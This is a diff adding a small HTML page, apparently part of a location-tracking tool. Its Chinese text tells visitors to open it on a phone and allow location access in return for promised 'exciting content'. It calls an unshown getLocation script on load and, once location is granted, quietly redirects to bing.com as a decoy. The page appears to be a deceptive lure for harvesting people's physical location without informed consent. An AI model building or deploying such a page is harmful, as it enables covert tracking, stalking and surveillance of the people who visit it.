@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta property="og:title" content="DER - by JQ">
+    <meta property="og:site_name" content="CTDER">
+    <meta property="og:description" content="CN">
+    <meta property="og:image" content="">
+    <title>DER - by JQ</title>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" src="js/location.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body onload="getLocation(successCallback, errorCallback)">
+    <h1>请在手机端访问该内容，并允许定位服务。</h1>
+    <p>精彩内容即将呈现！</p>
+    <div id="change"></div>
+
+    <script>
+        function successCallback() {
+            window.location = 'https://www.bing.com';
+        }
+
+        function errorCallback() {
+            $('#change').html('定位失败，请检查您的定位服务是否已开启。');
+        }
+    </script>
+</body>
+</html>
